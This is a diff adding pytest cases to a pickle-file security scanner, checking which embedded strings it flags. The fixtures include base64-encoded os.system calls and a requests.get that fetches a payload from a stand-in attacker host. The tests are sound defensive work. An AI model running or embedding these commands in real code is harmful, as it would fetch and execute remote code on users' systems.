@@ -1078,6 +1078,19 @@ def test_scan_stream_detects_base64_encoded_execution_text(encoded: str, pattern
     assert not any(issue.message.startswith("Legacy encoded dangerous pattern detected") for issue in result.issues)
 
 
+def test_scan_stream_allows_base64_execution_text_inside_inert_url() -> None:
+    payload = pickle.dumps({"url": "https://example.invalid/path?b3Muc3lzdGVtKCdpZCcp"}, protocol=4)
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="encoded-url.pkl")
+    result.metadata["file_path"] = "encoded-url.pkl"
+    aggregate = create_initial_audit_result()
+    merge_scan_result(aggregate, result)
+
+    assert result.success is True
+    assert not any(issue.rule_code == "S604" for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 def test_scan_stream_keeps_base64_encoded_network_execution_actionable() -> None:
     payload = pickle.dumps(
         {"encoded": "b3Muc3lzdGVtKCdjdXJsIGh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS9wYXlsb2FkJyk="},
@@ -1873,6 +1886,24 @@ def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
         and issue.severity == IssueSeverity.CRITICAL
         and issue.details.get("type") == "explicit_network_pattern"
         and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize("line_ending", ["\n", "\r\n"])
+def test_scan_stream_keeps_explicitly_joined_network_url_actionable(line_ending: str) -> None:
+    payload = pickle.dumps(
+        {"loader": f"requests\\{line_ending}.get('https://attacker.example/payload')"},
+        protocol=0,
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="joined-network-code.pkl")
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
         and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
